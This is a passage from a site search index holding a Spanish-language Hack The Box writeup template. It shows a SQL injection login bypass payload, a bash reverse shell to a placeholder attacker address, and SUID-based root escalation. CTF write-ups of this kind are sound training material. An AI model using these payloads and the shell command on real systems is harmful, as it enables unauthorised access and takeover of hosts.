<code>/admin</code></p>"},{"location":"writeups/htb-example/#explotacion","title":"Explotaci\u00f3n","text":""},{"location":"writeups/htb-example/#sql-injection","title":"SQL Injection","text":"<p>El formulario de login es vulnerable a SQLi:</p> PayloadRequest <pre><code>' OR 1=1-- -\n</code></pre> <pre><code>POST /admin/login.php HTTP/1.1\nHost: 10.10.10.XX\n\nusername=admin&amp;password=' OR 1=1-- -\n</code></pre>"},{"location":"writeups/htb-example/#reverse-shell","title":"Reverse Shell","text":"<pre><code>bash -i &gt;&amp; /dev/tcp/10.10.14.XX/443 0&gt;&amp;1\n</code></pre>"},{"location":"writeups/htb-example/#escalada-de-privilegios","title":"Escalada de Privilegios","text":""},{"location":"writeups/htb-example/#enumeracion","title":"Enumeraci\u00f3n","text":"<pre><code>find / -perm -4000 2&gt;/dev/null\n</code></pre> <p>SUID Binary</p> <p><code>/usr/bin/custom_binary</code> tiene SUID y es explotable</p>"},{"location":"writeups/htb-example/#root","title":"Root","text":"<pre><code>/usr/bin/custom_binary -e '/bin/bash -p'\n</code></pre>"},{"location":"writeups/htb-example/#flags","title":"Flags","text":"Flag Hash User <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code> Root <code>xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</code> <p>Lecciones aprendidas</p> <ul> <li>Siempre probar SQLi en formularios de login</li> <li>Enumerar binarios SUID como parte del proceso de privesc</li> </ul>"}]}